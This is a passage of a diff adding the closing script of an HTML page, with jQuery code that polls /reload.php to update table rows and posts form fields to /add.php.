+          },
+          error: function (err) {
+            console.log(err);
+          },
+        });
+      }, 5000);
+      function doUpdate(row_id) {
+        $.ajax({
+          type: "POST",
+          url: "/reload.php",
+          data: { id: row_id },
+          dataType: "json",
+          success: function (res) {
+            if (rowHandlers[res.id]) {
+              rowHandlers[res.id].updateData(res);
+            } else {
+              rowHandlers[res.id] = new RowHandler(res);
+            }
+          },
+          error: function (err) {
+            console.log(err);
+          },
+        });
+      }
+      let addForm = $("#addForm");
+      addForm.on("submit", function () {
+        return false;
+      });
+      addForm.on("submit", function () {
+        let pd = {
+          action: "save",
+          data: {},
+        };
+        addForm.find("[data-cs-form-element]").each(function (k, v) {
+          v = $(v);
+          let name = v.attr("data-cs-form-element");
+          pd.data[name] = v.val();
+        });
+        $.ajax({
+          type: "POST",
+          url: "/add.php",
+          data: pd,
+          dataType: "json",
+          success: function (res) {
+            console.log(res);
+          },
+          error: function (err) {
+            console.log(err);
+          },
+        });
+      });
+    </script>
+  </body>
+</html>
